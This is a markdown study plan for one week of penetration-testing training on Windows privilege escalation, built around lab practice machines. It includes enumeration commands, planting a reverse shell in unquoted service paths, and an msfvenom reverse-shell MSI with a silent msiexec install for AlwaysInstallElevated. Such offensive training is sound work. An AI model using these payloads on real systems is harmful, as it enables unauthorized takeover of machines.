# 🪟 Week 4: Windows Privilege Escalation & PowerShell Tactics

> _“Anyone can land a shell. Few know how to turn a user shell into SYSTEM. That’s what makes you lethal.”_

---

## 🎯 Objectives
- Master Windows local privilege escalation techniques
- Understand service misconfigurations, registry abuses, and token manipulation
- Learn how to identify and exploit `Unquoted Service Paths`, `AlwaysInstallElevated`, and weak permissions
- Start getting comfortable with **PowerShell** for enumeration and exploitation
- Build a personal cheatsheet for common Windows privesc paths

---

## 🛠 Tools & Resources

|Tool|Purpose|
|---|---|
|`winPEAS.exe`|Automated Windows privilege escalation script|
|`accesschk.exe`|Check permissions on services/files|
|`PowerUp.ps1`|PowerShell enum and exploitation|
|`whoami`, `net`, `sc`, `wmic`|Native command enum|
|`winPEAS.bat`|Alternate PEAS for older systems|
|`findstr`, `icacls`, `reg query`|File and registry checks|
|`exploit-db`, `searchsploit`|Finding exploits manually|

---

## 💻 Target Machines

|Machine|Concepts Covered|
|---|---|
|**Bastion**|Windows backup files, SSH key abuse|
|**Netmon**|`AlwaysInstallElevated` exploit|
|**Arctic**|Service misconfiguration, weak perms|

---

## 🗓️ Daily Breakdown

---

### 📅 Monday – Windows Enumeration & Service Analysis

#### ✅ Objectives:
- Learn manual ways to analyze a Windows target for privesc
- Understand common local recon commands
#### 🔧 Tasks:
- From your low-priv shell (like `evil-winrm`):

```powershell
whoami /groups
systeminfo
tasklist /v
net users
net localgroup administrators
wmic service list brief

```

Check:
- Service permissions
- Installed patches
- Running processes
- Current user privileges
#### 📄 Deliverables:
- `windows-enum-cheatsheet.md`

---

### 📅 Tuesday – Unquoted Service Paths & Weak Permissions

#### ✅ Objectives:
- Identify services vulnerable to privilege escalation
#### 🔧 Tasks:
- Run:

```bash
wmic service get name,pathname,startmode
```

Look for paths with spaces that are not quoted.
Then:

```bash
accesschk.exe -uwcqv "Authenticated Users" * > perm-check.txt
```

If vulnerable:
- Place your reverse shell (`nc.exe`, `meterpreter.exe`) in the unquoted path
- Restart the service and catch SYSTEM
#### 📄 Deliverables:
- Proof of exploitation using unquoted path or weak permissions

---

### 📅 Wednesday – winPEAS & PowerUp + Manual Review

#### ✅ Objectives:
- Run and understand the output of `winPEAS.exe`
- Use `PowerUp.ps1` to check for vulnerabilities
- Match findings with manual recon
#### 🔧 Tasks:
- Upload & run:

```powershell
.\\winPEAS.exe > peas-output.txt
```

Or with: 

```powershell
powershell -ep bypass
. .\\PowerUp.ps1
Invoke-AllChecks
```

- Parse for:
    - AlwaysInstallElevated
    - Modifiable services
    - Registry abuses
#### 📄 Deliverables:
- Writeup of 2+ discovered vectors (even if not used)

---

### 📅 Thursday – Exploit AlwaysInstallElevated

#### ✅ Objectives:
- Exploit `AlwaysInstallElevated` to gain SYSTEM
#### 🔧 Tasks:

```powershell
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
```

If both are set to `1`:
- Create a `.msi` payload with `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=yourip LPORT=4444 -f msi > shell.msi
```

- Upload and run:

```bash
msiexec /quiet /qn /i shell.msi
```

#### 📄 Deliverables:
- Full proof of privesc using MSI method

---

### 📅 Friday – Root Bastion

#### ✅ Objectives:
- Enumerate backup files
- Recover passwords/SSH keys
- Escalate manually
#### 🔧 Tasks:
- Mount VHD files
- Look for credentials or key files
- Use recovered SSH keys to login as a higher-priv user
#### 📄 Deliverables:
- `bastion-report.md` with full privesc chain

---

### 📅 Saturday – Root Netmon + Arctic

#### ✅ Objectives:
- Practice two different privesc methods
- One with `AlwaysInstallElevated`, another with weak permissions
#### 🔧 Tasks:
- Netmon → MSI install exploit
- Arctic → Check services for writable directories or files, restart with malicious binary
#### 📄 Deliverables:
- `netmon-report.md`
- `arctic-report.md`

---

### 📅 Sunday – Reflection + Cheatsheet

#### ✅ Objectives:
- Write your personal `win-privesc-cheatsheet.md`
- Reflect on difficulty, blind spots, and habits to keep
#### 🔧 Tasks:
- Include:
    - Enumeration command list
    - All working escalation techniques
    - Commands used
- Update `ego-log.md` with:
    - What was hard?
    - What clicked?
    - What’s still unclear?

---

## ✅ End-of-Week Checklist

-  Rooted Bastion, Netmon, Arctic
-  Used winPEAS or PowerUp on all
-  Manual recon commands tested
-  `win-privesc-cheatsheet.md` created
-  3 full reports written
-  `ego-log.md` updated with lessons